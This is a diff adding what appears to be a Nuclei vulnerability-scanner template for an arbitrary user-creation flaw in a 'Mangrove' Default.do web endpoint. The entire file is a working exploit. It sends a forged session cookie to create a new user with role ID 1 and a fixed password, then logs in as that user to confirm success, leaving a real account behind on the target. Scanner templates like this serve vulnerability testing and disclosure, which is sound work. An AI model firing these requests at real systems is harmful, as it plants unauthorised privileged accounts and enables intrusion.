@@ -1,0 +1,47 @@
+id: poc-mangrove-create-user
+
+info:
+  name: Mangrove Default.do Arbitrary User Creation Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: privilege-bypass
+
+variables:
+  t1: "{{rand_int(100, 1000)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: create-user
+    method: POST
+    path:
+      - "/Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid="
+    headers:
+      Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      UserId=&GroupPower=1&VehiclePower=&UserName=test{{t1}}&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=1&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=qwer12341
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"Code":"200"'
+          - '"Result":"true"'
+    matchers-condition: and
+
+  - id: login-user
+    method: POST
+    path:
+      - "/Mvsp/RegisterLogin/Default.do?Action=Login&Type=post&DataType=Text&Guid="
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: JSESSIONID=; MVSP.C=Vj0yLjMuMS40LWNuJkw9emgtQ04mVD1kZWZhdWx0
+    body: |
+      UserName=test{{t1}}&Language=zh-CN&Password=qwer12341&AuthCode=
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"Code":"200"'
+          - '"Result":"true"'
+    matchers-condition: and
